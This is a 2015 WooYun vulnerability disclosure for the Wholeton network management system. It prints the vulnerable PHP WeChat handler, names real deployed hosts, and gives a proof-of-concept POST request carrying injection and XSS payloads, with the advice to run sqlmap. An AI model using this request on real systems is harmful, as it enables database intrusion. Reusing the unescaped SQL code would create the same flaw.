{"id": 25347, "wybug_id": "wooyun-2015-0103638", "wybug_title": "惠尔顿上网行为管理系统XML实体注入（无需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2015-03-25 17:23", "wybug_open_date": "2015-06-25 16:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： 惠尔顿上网行为管理系统XML实体注入（无需登录） 详细说明：  惠尔顿上网行为管理系统XML实体注入（无需登录）官网经典案例：http://www.wholeton.com/Anli.php外网部分实际案例：\n1.https://test.bescar.com2.https://angelic.com.cn/3.http://222.223.56.1164.https://222.92.15.1005.http://111.206.133.4/6.http://mail.hualiu.cc/\n这里存在一个通用的xml实体注入问题之前有过分析： WooYun: 74CMS最新版绕过继续任意文件读取(通用性分析)到任意文件删除 这里也用到了那个微信的接口，导致同样的问题，不过这里没有文件读取，但是导致大量SQL注文件：/base/wechat_interface.php\n<?php/**  * wechat php test  *///define your token$thisfile = basename($_SERVER['PHP_SELF']);$RootDir = $_SERVER[\"DOCUMENT_ROOT\"].'/base';include_once \"$RootDir/include/database.php\";define(\"TOKEN\", \"wholeton\");\t$wechatObj = new wechatCallbackapiTest();if (!isset($_GET[\"echostr\"])){\t$wechatObj->responseMsg();}else{\t$wechatObj->valid();}exit;class wechatCallbackapiTest{\tpublic function valid()    {        $echoStr = $_GET[\"echostr\"];        //valid signature , option        if($this->checkSignature()){        \techo $echoStr;        }    }    public function responseMsg()    {\t\t//get post data, May be due to the different environments\t\t$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];      \t//extract post data\t\tif (!empty($postStr)){\t\t\t\t//$fw = fopen(\"/usr/local/WholetonTM/htdocs/wx.txt\", \"w\");\t              \t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);                $fromUsername = $postObj->FromUserName;                $toUsername = $postObj->ToUserName;                $event = trim($postObj->Event);                $EventKey = trim($postObj->EventKey);               \t\t\t\t\t// $g_str .= \"fromUsername: \".$fromUsername.\"\\n\";\t\t\t\t// $g_str .= \"toUsername: \".$toUsername.\"\\n\";   \t\t\t\t// $g_str .= \"event: \".$event.\"\\n\"; \t\t\t\t// $g_str .= \"EventKey: \".str_replace(\"qrscene_\",\"\",$EventKey).\"\\n\";\t\t\t\t//fwrite($fw, $g_str);\t\t\t\tswitch ($event) {\t\t\t\t\tcase 'subscribe':\t\t\t\t\t\t$focus = 1;\t\t\t\t\t\t$scene_id = str_replace(\"qrscene_\",\"\",$EventKey);\t\t\t\t\t\tbreak;\t\t\t\t\tcase 'unsubscribe':\t\t\t\t\t\t$focus = 0;\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 'SCAN':\t\t\t\t\t\t$focus = 1;\t\t\t\t\t\t$scene_id = $postObj->EventKey;\t\t\t\t\t\tbreak;\t\t\t\t\t\t}\t\t\t\t//fwrite($fw, \"focus:\".$focus.\"\\n\");\t\t\t\tglobal $gblDBConnect;\t\t\t\t$sql_policy_info = \"select id from tb_wechat_promote_policy where original_id='$toUsername'\";\t\t\t\t//fwrite($fw, \"sql_policy_info:\".$sql_policy_info.\"\\n\");\t\t\t\t$data_policy_info= $gblDBConnect->getOne($sql_policy_info);\t\t\t\t\t\t\t\t$sql_user_obj = \"select count(*) as num, id, mac_list from tb_wechat_user_obj where promote_policy_id=\".$data_policy_info->id.\" and wechat_id='$fromUsername'\";\t\t\t\t$data_user_obj = $gblDBConnect->getOne($sql_user_obj);\t\t\t\t//fwrite($fw, \"sql_user_obj:\".$sql_user_obj.\"\\n\");\t\t\t\t$sql_edit_mac = \"\";\t\t\t\tif($focus==1){\t\t\t\t\t$sql_mac = \"select mac from tb_wechat_mac_scene where scene_id=\".$scene_id;\t\t\t\t\t//fwrite($fw, \"sql_mac:\".$sql_mac.\"\\n\");\t\t\t\t\t$data_mac = $gblDBConnect->getOne($sql_mac);\t\t\t\t\t\t$mac = $data_mac->mac;\t\t\t\t\t\tif ($data_user_obj->mac_list!=\"\") {\t\t\t\t\t \t$mac_list_ary = explode(\",,\",$data_user_obj->mac_list);\t\t\t\t\t \t//fwrite($fw, \"mac_list:\".$ata_user_obj->mac_list.\"\\n\");\t\t\t\t\t \tif (is_array($mac_list_ary)) {\t\t\t\t\t\t \tif (!in_array($mac, $mac_list_ary)) {\t\t\t\t\t\t \t\t//fwrite($fw, \" not in_array:\".$mac.\"\\n\");\t\t\t\t\t\t \t\t$mac_list_ary[] = $mac;\t\t\t\t\t\t \t\t$mac_str = implode(\",,\", $mac_list_ary);\t\t\t\t\t\t \t\t$sql_edit_mac = \"mac_list='$mac_str', \";\t\t\t\t\t\t \t}\t\t\t\t\t\t }\t\t\t\t\t}else {\t\t\t\t\t\t//fwrite($fw, \" not = mac_list:\".$mac.\"\\n\");\t\t\t\t\t\t$sql_edit_mac = \"mac_list='$mac', \";\t\t\t\t\t} \t\t\t\t\t \t\t\t\t\t\t}\t\t\t\t//fwrite($fw, \"num\".$data_user_obj->num.\"\\n\");\t\t\t\tif($data_user_obj->num==0){\t\t\t\t  \t$sql_add = \"insert into tb_wechat_user_obj(promote_policy_id, wechat_id, mac_list, focus) values($data_policy_info->id, '$fromUsername', '$mac', $focus)\";\t\t\t\t\t//fwrite($fw, \"sql_add:\".$sql_add.\"\\n\");\t\t\t\t \t$gblDBConnect->execute($sql_add);\t\t\t\t }else{\t\t \t\t\t\t\t\t\t\t\t$sql_edit = \"update tb_wechat_user_obj set \".$sql_edit_mac.\"focus=$focus where id=\".$data_user_obj->id;\t\t\t\t  \t//fwrite($fw, \"sql_edit:\".$sql_edit.\"\\n\");\t\t\t\t \t$gblDBConnect->execute($sql_edit);\t\t\t\t}\t\t\t\texec('/usr/local/WholetonTM/triton/bin/TritonIPCTools -R');\t\t\t\t//fwrite($fw, $g_str);\t\t\t\t//fclose($fw);\t\t\t        }else {\t\t\t//$g_str .=  \"exit in valid()\\n\";        \texit;        }    }\tprivate function receiveEvent($object){\t\t$content = \"\";\t\t\t\tswitch ($object->Event) {\t\t\tcase 'subscribe':\t\t\t\t $content = (!empty($object->EventKey))?(\"\\n来自二维码场景 \".str_replace(\"qrscene_\",\"\",$object->EventKey)):\"\";\t\t\t\tbreak;\t\t\tcase 'unsubscribe':\t\t\t\t$content = \"取消关注\";\t\t\t\tbreak;\t\t\t\tcase 'SCAN':\t\t\t\t$content = \"扫描场景\". $object->EventKey;\t\t\t\tbreak;\t\t\t}\t\t$fw = fopen(\"/usr/local/WholetonTM/htdocs/wx1.txt\", \"w\");\t\t\tfwrite($fw, ($object->Event).\"\\nEventKey:\".($object->EventKey).\"\\n\".$content);\t\tfclose($fw);\t\treturn $content;\t}\t\tprivate function checkSignature()\t{        $signature = $_GET[\"signature\"];        $timestamp = $_GET[\"timestamp\"];        $nonce = $_GET[\"nonce\"];\t        \t\t\t\t$token = TOKEN;\t\t$tmpArr = array($token, $timestamp, $nonce);\t\tsort($tmpArr, SORT_STRING);\t\t$tmpStr = implode( $tmpArr );\t\t$tmpStr = sha1( $tmpStr );\t\t\t\tif( $tmpStr == $signature ){\t\t\treturn true;\t\t}else{\t\t\treturn false;\t\t}\t}}?>\n当没有$_GET[\"echostr\"]函数时，则直接调用responseMsg，不用判断checkSignature了然后获取：$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];之后xml中的参数值进入sql语句里面的4各参数：$fromUsername、$toUsername、$even、$EventKey都存在注入   漏洞证明：  保存如下请求为111.txt\nPOST /base/wechat_interface.php HTTP/1.1Host: https://test.bescar.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Forwarded-For: <img src=1 onerror=alert(1)>127.0.0.1Connection: keep-aliveContent-Type: text/xmlContent-Length: 179<?xml version=\"1.0\" encoding=\"utf-8\"?><xml><ToUserName>111111*</ToUserName><FromUserName>222222</FromUserName><EventKey>333333</EventKey><Event>subscribe</Event></xml>\n然后使用sqlmap跑一下即可。\n\n\n\n   修复方案：  个系统可以重写了。。。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-03-27 16:44 厂商回复： 已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-25 17:27 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  @水晶  关注下 xml~    \n     2015-03-25 17:34 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  m    \n     2015-03-26 07:33 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  这个不多见。    \n     2015-03-26 10:50 |    \t\t水晶 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:15        | 热爱生活，喜欢互联网)\t\t \n  @Ton7BrEak ok    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}